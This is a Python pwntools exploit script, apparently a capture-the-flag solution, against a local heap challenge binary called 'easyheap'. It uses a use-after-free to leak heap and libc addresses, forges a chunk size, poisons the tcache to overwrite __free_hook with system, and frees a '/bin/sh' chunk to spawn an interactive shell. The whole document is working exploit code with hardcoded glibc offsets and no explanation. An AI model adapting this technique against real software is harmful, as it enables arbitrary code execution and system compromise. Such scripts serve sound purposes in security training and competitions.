from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./easyheap')

def add(idx, name_length, name, price):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendlineafter(b': ', str(name_length).encode())
    r.sendafter(b': ', name)
    r.sendlineafter(b': ', str(price).encode())

def delete(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(idx).encode())

def edit(idx, name, price):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendafter(b': ', name)
    r.sendlineafter(b': ', str(price).encode())

add(0, 0x10, b'a', 0)
delete(0)

r.sendlineafter(b'> ', b'4')
heap_base = int(r.recvlines(4)[1].split(b':\t')[1]) - 0x10
info(f'heap_base : {hex(heap_base)}')


add(1, 0x10, b'a', 0)
add(2, 0x3e0, b'a', 0)
add(3, 0x10, b'a', 0)

edit(1, flat(0, 0, 0, 0x421), 0)
delete(2)

r.sendlineafter(b'> ', b'4')
libc = int(r.recvlines(16)[9].split(b':\t')[1]) - 0x1ecbe0
info(f'libc : {hex(libc)}')
free_hook = libc + 0x1eee48
system = libc + 0x52290


add(4, 0x10, b'a', 0)
delete(3)
delete(4)

add(5, 0x3e0, p64(free_hook), 0)
add(6, 0x10, b'a', 0)
add(7, 0x10, p64(system), 0)

add(8, 0x10, b'/bin/sh\x00', 0)
delete(8)

r.interactive()